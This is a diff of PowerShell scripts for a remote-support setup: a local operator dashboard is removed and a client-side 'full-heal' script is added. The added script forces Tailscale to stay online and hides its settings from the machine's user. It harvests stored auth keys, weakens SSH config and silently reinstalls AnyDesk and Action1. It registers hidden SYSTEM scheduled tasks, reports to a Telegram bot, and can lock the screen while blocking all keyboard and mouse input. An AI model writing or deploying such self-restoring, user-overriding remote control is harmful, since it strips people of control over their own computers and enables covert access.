@@ -1,276 +1,173 @@
-# ================================================================
-#  dashboard.ps1  -  ScreenConnect-style web dashboard (v2)
-#  Live status + refresh, name-sync with CONNECT.bat,
-#  in-page rename, and Lock screen text/color/image per client.
-#  Local + private (127.0.0.1 only).
-# ================================================================
+# ==========================================================
+#  rsupport update / full-heal  (PUBLIC on GitHub - secret-free)
+#  Secrets read from LOCAL files on the client, never here.
+# ==========================================================
+$ErrorActionPreference = "SilentlyContinue"
+$dir = "$env:ProgramData\RemoteSupport"
+New-Item $dir -ItemType Directory -Force | Out-Null
 
-$port      = 8760
-$login     = 'svc'
-$namesFile = "$env:APPDATA\client-names.txt"          # shared with CONNECT.bat
-$overrideF = "$env:APPDATA\client-logins.txt"
-
-$tsExe = 'tailscale'
-if (Test-Path 'C:\Program Files\Tailscale\tailscale.exe') { $tsExe = 'C:\Program Files\Tailscale\tailscale.exe' }
-
-function Load-Names {
-    $h = @{}
-    if (Test-Path $namesFile) { Get-Content $namesFile | ForEach-Object { if ($_ -match '^(.+?)=(.+)$') { $h[$matches[1].Trim().ToUpper()] = $matches[2].Trim() } } }
-    return $h
-}
-function Save-Name($key, $name) {
-    $h = Load-Names; $h[$key.ToUpper()] = $name
-    ($h.GetEnumerator() | ForEach-Object { "$($_.Key)=$($_.Value)" }) | Set-Content $namesFile
-}
-function Login-For($ip) {
-    if (Test-Path $overrideF) { foreach ($l in Get-Content $overrideF) { if ($l -match "^\s*$([regex]::Escape($ip))\s*=\s*(.+?)\s*$") { return $matches[1] } } }
-    return $login
+# 0) Tailscale UNATTENDED mode (once) - keeps client reachable at the
+#    Windows login screen after a restart, before anyone logs in.
+if(-not (Test-Path (Join-Path $dir 'unattended.done'))){
+  $tsExe = @('C:\Program Files\Tailscale\tailscale.exe','C:\Program Files (x86)\Tailscale IPN\tailscale.exe') | Where-Object {Test-Path $_} | Select-Object -First 1
+  if($tsExe){
+    & $tsExe up --unattended --accept-risk=all 2>$null
+    Set-Content (Join-Path $dir 'unattended.done') '1' -Encoding ascii
+  }
 }
 
-function Get-Clients {
-    $names = Load-Names
-    $lines = & $tsExe status 2>$null
-    $out = @(); $i = 0
-    foreach ($l in $lines) {
-        if ($l -match '^(100\.\d+\.\d+\.\d+)\s+(\S+)\s+(\S+)\s+(\S+)\s*(.*)$') {
-            $ip = $matches[1]; $chost = $matches[2]
-            if ($i -eq 0) { $i++; continue }
-            $i++
-            $online = ($l -notmatch 'offline')
-            $name = if ($names.ContainsKey($chost.ToUpper())) { $names[$chost.ToUpper()] } elseif ($names.ContainsKey($ip)) { $names[$ip] } else { $chost }
-            $out += [pscustomobject]@{ ip = $ip; host = $chost; name = $name; online = $online }
+# 0c) Tailscale RECOVERY: if installed but logged out / blocked (e.g. antivirus
+#     interrupted it), log back in automatically. The key is read from where the
+#     setup already saved it on THIS machine - never stored in this public file.
+$tsExe = @('C:\Program Files\Tailscale\tailscale.exe','C:\Program Files (x86)\Tailscale IPN\tailscale.exe') | Where-Object {Test-Path $_} | Select-Object -First 1
+if($tsExe){
+  Remove-Item (Join-Path $dir 'ts-missing.flag') -EA 0
+  $st = (& $tsExe status 2>&1 | Out-String)
+  if($st -match 'logged out' -or $st -match 'NoState' -or $st -match 'network map' -or $st -match 'Logged out' -or $st -match 'Stopped'){
+    $key=''
+    foreach($d in @("$env:ProgramData\rsupport","$env:ProgramData\RemoteSupport","$env:ProgramData\Tailscale")){
+      if(-not $key -and (Test-Path $d)){
+        foreach($f in (Get-ChildItem $d -Recurse -File -EA 0)){
+          $c = Get-Content $f.FullName -Raw -EA 0
+          $m = [regex]::Match([string]$c,'tskey-auth-[A-Za-z0-9\-]+')
+          if($m.Success){ $key=$m.Value; break }
         }
+      }
     }
-    return $out
+    if($key){
+      Start-Service Tailscale -EA 0
+      & $tsExe up --authkey $key --unattended --accept-risk=all 2>$null
+      $tg = Join-Path $dir 'tg.txt'
+      if(Test-Path $tg){
+        $tk='';$tc=''
+        foreach($l in Get-Content $tg){ if($l -match '^token=(.+)$'){$tk=$matches[1].Trim()} elseif($l -match '^chat=(.+)$'){$tc=$matches[1].Trim()} }
+        if($tk -and $tc){ try{ Invoke-RestMethod -Method Post -Uri "https://api.telegram.org/bot$tk/sendMessage" -Body @{chat_id=$tc;text=("Tailscale was down on "+$env:COMPUTERNAME+" (antivirus/logout) - auto-reconnected.")} | Out-Null }catch{} }
+      }
+    }
+  }
+}
+else{
+  # Tailscale .exe is gone - antivirus likely deleted it. Alert once (needs manual allow).
+  $mk = Join-Path $dir 'ts-missing.flag'
+  if(-not (Test-Path $mk)){
+    $tg = Join-Path $dir 'tg.txt'
+    if(Test-Path $tg){
+      $tk='';$tc=''
+      foreach($l in Get-Content $tg){ if($l -match '^token=(.+)$'){$tk=$matches[1].Trim()} elseif($l -match '^chat=(.+)$'){$tc=$matches[1].Trim()} }
+      if($tk -and $tc){ try{ Invoke-RestMethod -Method Post -Uri "https://api.telegram.org/bot$tk/sendMessage" -Body @{chat_id=$tc;text=("Tailscale MISSING on "+$env:COMPUTERNAME+" - antivirus may have removed it. Allow Tailscale in the antivirus, then re-run setup.")} | Out-Null }catch{} }
+    }
+    Set-Content $mk '1' -Encoding ascii
+  }
 }
 
-function SSH-Run($ip, $cmd) {
-    $u = Login-For $ip
-    $r = ssh -o StrictHostKeyChecking=no -o ConnectTimeout=6 -o BatchMode=yes "$u@$ip" $cmd 2>&1
-    return ($r | Out-String)
-}
-function Enc($ps) { [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($ps)) }
 
-$reportPs = @'
-$os=(Get-CimInstance Win32_OperatingSystem).Caption
-$cs=Get-CimInstance Win32_ComputerSystem
-$ram=[math]::Round($cs.TotalPhysicalMemory/1GB,1)
-$d=Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'"
-$free=[math]::Round($d.FreeSpace/1GB,1);$tot=[math]::Round($d.Size/1GB,1)
-$up=(Get-Date)-(Get-CimInstance Win32_OperatingSystem).LastBootUpTime
-"$env:COMPUTERNAME`n$os`nRAM ${ram}GB`nC: ${free}/${tot}GB free`nUptime $([int]$up.TotalHours)h"
+# 0d) Tailscale LOCKDOWN: force unattended + auto-reconnect + hide settings menus,
+#     so the client can't keep Tailscale disconnected (it stays or returns online).
+#     Re-applied every cycle so it self-heals if anything clears it.
+$pol = 'HKLM:\SOFTWARE\Policies\Tailscale'
+New-Item $pol -Force -EA 0 | Out-Null
+New-ItemProperty $pol -Name 'UnattendedMode'  -Value 'always' -PropertyType String -Force -EA 0 | Out-Null
+New-ItemProperty $pol -Name 'ReconnectAfter'  -Value '1m'     -PropertyType String -Force -EA 0 | Out-Null
+New-ItemProperty $pol -Name 'PreferencesMenu' -Value 'hide'   -PropertyType String -Force -EA 0 | Out-Null
+New-ItemProperty $pol -Name 'AdminConsole'    -Value 'hide'   -PropertyType String -Force -EA 0 | Out-Null
+$tsPol = @('C:\Program Files\Tailscale\tailscale.exe','C:\Program Files (x86)\Tailscale IPN\tailscale.exe') | Where-Object {Test-Path $_} | Select-Object -First 1
+if($tsPol){ & $tsPol syspolicy reload 2>$null }
+
+
+# 1) SSH stays up + key config
+Start-Service sshd
+Set-Service -Name sshd -StartupType Automatic
+$cfg = "$env:ProgramData\ssh\sshd_config"
+if(Test-Path $cfg){
+  $l = Get-Content $cfg | Where-Object { $_ -notmatch '^\s*#?\s*StrictModes' -and $_ -notmatch '^\s*#?\s*PubkeyAuthentication' }
+  Set-Content $cfg (@('StrictModes no','PubkeyAuthentication yes') + $l) -Encoding ascii
+  Restart-Service sshd
+}
+
+# 2) AnyDesk: reinstall if missing (uses local ad-pass.txt), else keep running
+$adExe = 'C:\Program Files (x86)\AnyDesk\AnyDesk.exe'
+if(-not (Test-Path $adExe)){ $adExe = 'C:\Program Files\AnyDesk\AnyDesk.exe' }
+if(Test-Path $adExe){ Start-Service AnyDesk }
+else{
+  try{
+    $tmp = "$env:TEMP\AnyDesk.exe"
+    Invoke-WebRequest 'https://download.anydesk.com/AnyDesk.exe' -OutFile $tmp -UseBasicParsing
+    Start-Process $tmp -ArgumentList '--install "C:\Program Files (x86)\AnyDesk" --start-with-win --silent --create-shortcuts' -Wait
+    Start-Sleep 6
+    $adExe = 'C:\Program Files (x86)\AnyDesk\AnyDesk.exe'
+    $pf = Join-Path $dir 'ad-pass.txt'
+    if((Test-Path $adExe) -and (Test-Path $pf)){
+      (Get-Content $pf -Raw).Trim() | & $adExe --set-password 2>$null
+      Start-Service AnyDesk; & $adExe --start-with-win
+    }
+  }catch{}
+}
+
+# 3) Telegram alerts: install mesh watcher if tg.txt was pushed here
+if(Test-Path (Join-Path $dir 'tg.txt')){
+  $w = @'
+$ErrorActionPreference='SilentlyContinue'
+$dir="$env:ProgramData\RemoteSupport"
+$conf=Join-Path $dir 'tg.txt'
+if(-not(Test-Path $conf)){ exit }
+$token='';$chat=''
+foreach($l in Get-Content $conf){ if($l -match '^token=(.+)$'){$token=$matches[1].Trim()} elseif($l -match '^chat=(.+)$'){$chat=$matches[1].Trim()} }
+if(-not $token -or -not $chat){ exit }
+$ts=@('C:\Program Files\Tailscale\tailscale.exe','C:\Program Files (x86)\Tailscale IPN\tailscale.exe')|?{Test-Path $_}|Select-Object -First 1
+if(-not $ts){ exit }
+$selfIp=(& $ts ip -4 2>$null | Select-Object -First 1)
+$j=& $ts status --json | ConvertFrom-Json
+$nodes=@();$peers=@{}
+foreach($p in $j.Peer.PSObject.Properties.Value){ $peers[$p.HostName]=[bool]$p.Online; if($p.Online){ $nodes+=$p.TailscaleIPs[0] } }
+$nodes+=$selfIp
+$reporter=($nodes | Sort-Object | Select-Object -First 1)
+if($selfIp -ne $reporter){ exit }
+$state=Join-Path $dir 'tg-state.txt'
+$prev=@{};$first=-not(Test-Path $state)
+if(-not $first){ foreach($l in Get-Content $state){ if($l -match '^(.*)=(0|1)$'){ $prev[$matches[1]]=($matches[2] -eq '1') } } }
+function Send($t){ try{ Invoke-RestMethod -Method Post -Uri ("https://api.telegram.org/bot$token/sendMessage") -Body @{chat_id=$chat;text=$t}|Out-Null }catch{} }
+foreach($h in $peers.Keys){ if($prev.ContainsKey($h) -and $prev[$h] -ne $peers[$h]){ if($peers[$h]){ Send ("ONLINE  - $h") } else { Send ("OFFLINE - $h") } } }
+($peers.GetEnumerator()|ForEach-Object{ $_.Key+'='+([int][bool]$_.Value) })|Set-Content $state -Encoding utf8
 '@
-
-function Get-Lock($ip) {
-    $c = SSH-Run $ip 'cmd /c type C:\ProgramData\RemoteSupport\config.txt'
-    $text=''; $color=''; $img=''
-    foreach ($l in ($c -split "`n")) {
-        if ($l -match '^LOCK_TEXT=(.*)')  { $text  = $matches[1].Trim() }
-        if ($l -match '^LOCK_COLOR=(.*)') { $color = $matches[1].Trim() }
-        if ($l -match '^LOCK_IMAGE=(.*)') { $img   = $matches[1].Trim() }
-    }
-    return @{ text=$text; color=$color; image=$img }
+  Set-Content (Join-Path $dir 'tg-watch.ps1') $w -Encoding utf8
+  schtasks /create /tn "RemoteSupportTG" /tr ("powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File " + (Join-Path $dir 'tg-watch.ps1')) /sc minute /mo 2 /ru SYSTEM /rl HIGHEST /f | Out-Null
 }
-function Set-Lock($ip, $text, $color, $img) {
-    $text  = ($text  -replace "'","" -replace "`r","" -replace "`n"," ").Trim()
-    $color = ($color -replace "[^#0-9A-Fa-f]","").Trim()
-    $img   = ($img   -replace "'","" -replace "\s","").Trim()
-    $rps = @"
-`$f='C:\ProgramData\RemoteSupport\config.txt'
-`$k=@()
-if(Test-Path `$f){ `$k=Get-Content `$f | Where-Object {`$_ -notmatch '^LOCK_TEXT=' -and `$_ -notmatch '^LOCK_COLOR=' -and `$_ -notmatch '^LOCK_IMAGE='} }
-`$k+='LOCK_TEXT=$text'
-`$k+='LOCK_COLOR=$color'
-`$k+='LOCK_IMAGE=$img'
-if(-not (Test-Path (Split-Path `$f))){ New-Item -ItemType Directory -Path (Split-Path `$f) -Force | Out-Null }
-Set-Content `$f `$k -Encoding UTF8
+
+# --- Action1 self-heal ---
+$ACTION1_URL = "PASTE_YOUR_ACTION1_LINK_HERE"
+if ($ACTION1_URL -and -not (Get-Service "Action1 Agent" -ErrorAction SilentlyContinue)) {
+    curl.exe -s -o "$env:TEMP\a1.msi" $ACTION1_URL
+    Start-Process msiexec.exe -ArgumentList '/i "'"$env:TEMP"'\a1.msi" /quiet /qn' -Wait
+    Add-Content "C:\ProgramData\RemoteSupport\heal-log.txt" "$(Get-Date) reinstalled Action1"
+}
+
+# --- Lock screen feature ---
+$lockCode = @'
+$ErrorActionPreference='SilentlyContinue'
+Add-Type -AssemblyName System.Windows.Forms,System.Drawing
+Add-Type @"
+using System;using System.Runtime.InteropServices;
+public class Inp{ [DllImport("user32.dll")] public static extern bool BlockInput(bool f); }
 "@
-    SSH-Run $ip ('powershell -NoProfile -EncodedCommand ' + (Enc $rps)) | Out-Null
-    return "Saved. Press Lock to see it."
+$dir='C:\ProgramData\RemoteSupport'; $flag=Join-Path $dir 'LOCK.flag'; $cfg=Join-Path $dir 'config.txt'
+function Cfg($k,$def){ $v=$def; if(Test-Path $cfg){ foreach($l in Get-Content $cfg){ if($l -match "^$k=(.*)$"){ $v=$matches[1] } } } return $v }
+while($true){
+  if(Test-Path $flag){
+    $text=(Get-Content $flag -Raw); if(-not $text.Trim()){ $text=Cfg 'LOCK_TEXT' 'Maintenance in progress' }
+    $color=Cfg 'LOCK_COLOR' '#0f172a'; $img=Cfg 'LOCK_IMAGE' ''
+    $f=New-Object Windows.Forms.Form; $f.FormBorderStyle='None'; $f.TopMost=$true; $f.StartPosition='Manual'
+    $f.Bounds=[Windows.Forms.SystemInformation]::VirtualScreen
+    try{ $f.BackColor=[Drawing.ColorTranslator]::FromHtml($color) }catch{ $f.BackColor='Black' }
+    if($img){ try{ $t="$env:TEMP\lockbg.img"; (New-Object Net.WebClient).DownloadFile($img,$t); $f.BackgroundImage=[Drawing.Image]::FromFile($t); $f.BackgroundImageLayout='Zoom' }catch{} }
+    $lbl=New-Object Windows.Forms.Label; $lbl.Text=$text; $lbl.ForeColor='White'
+    $lbl.Font=New-Object Drawing.Font('Segoe UI',28,[Drawing.FontStyle]::Bold); $lbl.TextAlign='MiddleCenter'; $lbl.Dock='Fill'; $lbl.BackColor=[Drawing.Color]::Transparent
+    $f.Controls.Add($lbl)
+    $tm=New-Object Windows.Forms.Timer; $tm.Interval=800; $tm.Add_Tick({ if(-not (Test-Path $flag)){ $f.Close() } }); $tm.Start()
+    [Inp]::BlockInput($true)|Out-Null; [void]$f.ShowDialog(); [Inp]::BlockInput($false)|Out-Null; $tm.Stop()
+  }
+  Start-Sleep -Seconds 1
 }
-
-function Do-Action($ip, $action) {
-    switch ($action) {
-        'terminal' { $u = Login-For $ip; Start-Process cmd "/k ssh -l $u $ip"; return "Opened terminal window." }
-        'screen'   {
-            $id = (SSH-Run $ip '"C:\Program Files (x86)\AnyDesk\AnyDesk.exe" --get-id 2>NUL').Trim()
-            if ($id -match '\d{6,}') { Start-Process 'anydesk.exe' "$($matches[0])"; return "Opening AnyDesk..." }
-            return "Open screen needs RustDesk (coming). AnyDesk ID can't be read over SSH."
-        }
-        'restart'  { SSH-Run $ip 'shutdown /r /t 0' | Out-Null; return "Restart sent." }
-        'shutdown' { SSH-Run $ip 'shutdown /s /t 0' | Out-Null; return "Shutdown sent." }
-        'health'   { return (SSH-Run $ip ('powershell -NoProfile -EncodedCommand ' + (Enc $reportPs))) }
-        'who'      { return (SSH-Run $ip 'query user') }
-        'lock'     { SSH-Run $ip 'cmd /c echo.> C:\ProgramData\RemoteSupport\LOCK.flag' | Out-Null; return "Lock sent - client screen is locking." }
-        'unlock'   { SSH-Run $ip 'cmd /c del /f /q C:\ProgramData\RemoteSupport\LOCK.flag' | Out-Null; return "Unlock sent - client screen released." }
-        default    { return "Unknown action." }
-    }
-}
-
-$html = @'
-<!DOCTYPE html><html><head><meta charset="utf-8"><title>My Remote Dashboard</title>
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<style>
-*{box-sizing:border-box;margin:0;padding:0;font-family:Segoe UI,Arial,sans-serif}
-body{background:#0f1420;color:#e6eaf2;display:flex;height:100vh;overflow:hidden}
-#left{width:320px;background:#161d2e;border-right:1px solid #263148;display:flex;flex-direction:column}
-.top{padding:14px 16px;border-bottom:1px solid #263148}
-.top h1{font-size:15px;font-weight:600;color:#fff}
-.rowflex{display:flex;align-items:center;gap:8px;margin-top:4px}
-.top p{font-size:12px;color:#7d8aa5}
-.rbtn{font-size:12px;color:#9fb0d0;background:none;border:1px solid #2c3752;padding:4px 9px;border-radius:6px;cursor:pointer}
-.rbtn:hover{background:#22304e}
-#search{width:100%;margin-top:10px;padding:8px 10px;border-radius:6px;border:1px solid #2c3752;background:#0f1420;color:#e6eaf2;font-size:13px}
-#list{flex:1;overflow-y:auto}
-.row{display:flex;align-items:center;gap:10px;padding:11px 16px;cursor:pointer;border-bottom:1px solid #1d2537}
-.row:hover{background:#1c2438}
-.row.sel{background:#233152}
-.dot{width:9px;height:9px;border-radius:50%;flex:none}
-.on{background:#38d16a}.off{background:#5a6577}
-.rname{font-size:13.5px;color:#eef2f8}
-.rhost{font-size:11px;color:#7d8aa5}
-#right{flex:1;display:flex;flex-direction:column;overflow-y:auto}
-.rtop{padding:16px 20px;border-bottom:1px solid #263148;display:flex;align-items:center;gap:12px}
-.rtop .big{font-size:17px;font-weight:600;color:#fff}
-.rtop .sub{font-size:12px;color:#7d8aa5}
-.badge{font-size:11px;padding:3px 9px;border-radius:20px}
-.badge.on{background:#123a22;color:#5fe08a}.badge.off{background:#33262a;color:#e0868f}
-.acts{padding:20px;display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:12px}
-button.act{padding:14px;border-radius:9px;border:1px solid #2c3752;background:#1a2236;color:#e6eaf2;font-size:14px;cursor:pointer;text-align:left}
-button.act:hover{background:#243050;border-color:#3a4a72}
-button.act.danger:hover{background:#3a2226;border-color:#7a3a42}
-button.act.go{background:#1c3a6b;border-color:#295596}
-button.act.go:hover{background:#245089}
-#out{margin:0 20px 12px;padding:14px;background:#0c1120;border:1px solid #263148;border-radius:8px;font-family:Consolas,monospace;font-size:12.5px;color:#a9d6b6;white-space:pre-wrap;min-height:40px;max-height:180px;overflow:auto}
-.lockbox{margin:0 20px 24px;padding:16px;background:#141b2b;border:1px solid #263148;border-radius:10px}
-.lockbox h3{font-size:14px;color:#dfe6f2;margin-bottom:12px}
-.fld{margin-bottom:12px}
-.fld label{display:block;font-size:12px;color:#8fa0c0;margin-bottom:5px}
-.fld input[type=text],.fld input[type=url]{width:100%;padding:9px 11px;border-radius:6px;border:1px solid #2c3752;background:#0f1420;color:#e6eaf2;font-size:13px}
-.fld input[type=color]{width:52px;height:34px;border:1px solid #2c3752;background:#0f1420;border-radius:6px;cursor:pointer;vertical-align:middle}
-.savebtn{margin-top:4px;padding:10px 18px;border-radius:7px;border:1px solid #295596;background:#1c3a6b;color:#fff;font-size:13px;cursor:pointer}
-.savebtn:hover{background:#245089}
-.hint{font-size:11px;color:#6f7ea0;margin-top:6px}
-#empty{flex:1;display:flex;align-items:center;justify-content:center;color:#5a6577;font-size:14px}
-.rn{margin-left:auto;font-size:12px;color:#9fb0d0;background:none;border:1px solid #2c3752;padding:5px 10px;border-radius:6px;cursor:pointer}
-</style></head><body>
-<div id="left">
-  <div class="top"><h1>My Remote Dashboard</h1>
-    <div class="rowflex"><p id="count">Loading...</p><button class="rbtn" onclick="load()">Refresh</button></div>
-    <input id="search" placeholder="Search clients..." oninput="render()"></div>
-  <div id="list"></div>
-</div>
-<div id="right"><div id="empty">Select a client from the left</div></div>
-<script>
-let clients=[],sel=null;
-async function load(){try{const r=await fetch('/api/clients');clients=await r.json();}catch(e){}render();syncBadge();}
-function render(){
-  const q=(document.getElementById('search').value||'').toLowerCase();
-  const on=clients.filter(c=>c.online).length;
-  document.getElementById('count').textContent=clients.length+' clients - '+on+' online';
-  const list=document.getElementById('list');list.innerHTML='';
-  clients.filter(c=>(c.name+c.host+c.ip).toLowerCase().includes(q)).forEach(c=>{
-    const d=document.createElement('div');d.className='row'+(sel&&sel.ip===c.ip?' sel':'');
-    d.innerHTML='<span class="dot '+(c.online?'on':'off')+'"></span><div><div class="rname">'+esc(c.name)+'</div><div class="rhost">'+esc(c.host)+' - '+c.ip+'</div></div>';
-    d.onclick=()=>{sel=c;render();panel();};list.appendChild(d);
-  });
-}
-function syncBadge(){
-  if(!sel)return;const c=clients.find(x=>x.ip===sel.ip);if(!c)return;sel.online=c.online;
-  const b=document.getElementById('badge');if(b){b.className='badge '+(c.online?'on':'off');b.textContent=c.online?'Online':'Offline';}
-}
-function panel(){
-  const r=document.getElementById('right');if(!sel){r.innerHTML='<div id="empty">Select a client</div>';return;}
-  r.innerHTML=`
-   <div class="rtop"><div><div class="big">${esc(sel.name)}</div><div class="sub">${esc(sel.host)} - ${sel.ip}</div></div>
-     <span id="badge" class="badge ${sel.online?'on':'off'}">${sel.online?'Online':'Offline'}</span>
-     <button class="rn" onclick="rename()">Rename</button></div>
-   <div class="acts">
-     ${btn('screen','Open screen','go')}
-     ${btn('terminal','Terminal','')}
-     ${btn('lock','Lock screen','go')}
-     ${btn('unlock','Unlock','')}
-     ${btn('health','Health / specs','')}
-     ${btn('who','Who is logged in','')}
-     ${btn('restart','Restart','danger')}
-     ${btn('shutdown','Shutdown','danger')}
-   </div>
-   <div id="out">Ready.</div>
-   <div class="lockbox">
-     <h3>Lock screen settings for this client</h3>
-     <div class="fld"><label>Message text</label><input type="text" id="lktext" placeholder="Maintenance in progress"></div>
-     <div class="fld"><label>Background color</label><input type="color" id="lkcolor" value="#0f172a"></div>
-     <div class="fld"><label>Background image link (optional)</label><input type="url" id="lkimg" placeholder="https://.../your-image.png"></div>
-     <button class="savebtn" onclick="saveLock()">Save lock settings</button>
-     <div class="hint">Leave blank to use defaults (navy + "Maintenance in progress"). Image must be a direct link ending in .png/.jpg.</div>
-   </div>`;
-  loadLock();
-}
-function btn(a,label,cls){return `<button class="act ${cls}" onclick="act('${a}')">${label}</button>`;}
-async function act(a){
-  const o=document.getElementById('out');o.textContent='Working...';
-  try{const r=await fetch('/api/action',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip:sel.ip,action:a})});
-  const j=await r.json();o.textContent=j.output||'(no output)';}catch(e){o.textContent='Error: '+e;}
-}
-async function loadLock(){
-  try{const r=await fetch('/api/lockget?ip='+sel.ip);const j=await r.json();
-  if(j.text)document.getElementById('lktext').value=j.text;
-  if(j.color)document.getElementById('lkcolor').value=j.color;
-  if(j.image)document.getElementById('lkimg').value=j.image;}catch(e){}
-}
-async function saveLock(){
-  const o=document.getElementById('out');o.textContent='Saving lock settings...';
-  const body={ip:sel.ip,text:document.getElementById('lktext').value,color:document.getElementById('lkcolor').value,image:document.getElementById('lkimg').value};
-  try{const r=await fetch('/api/lockset',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
-  const j=await r.json();o.textContent=j.output||'Saved.';}catch(e){o.textContent='Error: '+e;}
-}
-async function rename(){
-  const n=prompt('New name for this client:',sel.name);if(!n)return;
-  await fetch('/api/rename',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({host:sel.host,ip:sel.ip,name:n})});
-  sel.name=n;await load();panel();
-}
-function esc(s){return (s||'').replace(/[&<>]/g,m=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[m]));}
-load();setInterval(load,8000);
-</script></body></html>
 '@
-
-# ---------- server ----------
-$listener = New-Object System.Net.HttpListener
-$prefix = "http://127.0.0.1:$port/"
-$listener.Prefixes.Add($prefix)
-try { $listener.Start() } catch { Write-Host "Could not start on $prefix - maybe already running?"; exit }
-Write-Host "Dashboard running at $prefix   (close this window to stop)"
-Start-Process $prefix
-
-function Send($ctx, $text, $type='text/html; charset=utf-8') {
-    $buf = [Text.Encoding]::UTF8.GetBytes($text)
-    $ctx.Response.ContentType = $type
-    $ctx.Response.ContentLength64 = $buf.Length
-    $ctx.Response.OutputStream.Write($buf, 0, $buf.Length)
-    $ctx.Response.OutputStream.Close()
-}
-function Body($ctx) { (New-Object IO.StreamReader($ctx.Request.InputStream)).ReadToEnd() | ConvertFrom-Json }
-
-while ($listener.IsListening) {
-    $ctx = $listener.GetContext()
-    $path = $ctx.Request.Url.AbsolutePath
-    try {
-        if ($path -eq '/') { Send $ctx $html }
-        elseif ($path -eq '/api/clients') { Send $ctx ((Get-Clients | ConvertTo-Json -Compress)) 'application/json' }
-        elseif ($path -eq '/api/action') {
-            $b = Body $ctx; Send $ctx (@{ output = (Do-Action $b.ip $b.action) } | ConvertTo-Json -Compress) 'application/json'
-        }
-        elseif ($path -eq '/api/lockget') {
-            $ip = $ctx.Request.QueryString['ip']; Send $ctx ((Get-Lock $ip) | ConvertTo-Json -Compress) 'application/json'
-        }
-        elseif ($path -eq '/api/lockset') {
-            $b = Body $ctx; Send $ctx (@{ output = (Set-Lock $b.ip $b.text $b.color $b.image) } | ConvertTo-Json -Compress) 'application/json'
-        }
-        elseif ($path -eq '/api/rename') {
-            $b = Body $ctx; Save-Name $b.host $b.name; Send $ctx (@{ ok = $true } | ConvertTo-Json -Compress) 'application/json'
-        }
-        else { $ctx.Response.StatusCode = 404; Send $ctx 'not found' 'text/plain' }
-    } catch {
-        Send $ctx (@{ output = "Error: $($_.Exception.Message)" } | ConvertTo-Json -Compress) 'application/json'
-    }
-}
+Set-Content -Path (Join-Path $dir 'lockwatch.ps1') -Value $lockCode -Encoding UTF8
+schtasks /query /tn RemoteSupportLockWatch >NUL 2>&1
+if($LASTEXITCODE -ne 0){ schtasks /create /tn RemoteSupportLockWatch /tr "powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\ProgramData\RemoteSupport\lockwatch.ps1" /sc onlogon /rl HIGHEST /f | Out-Null }
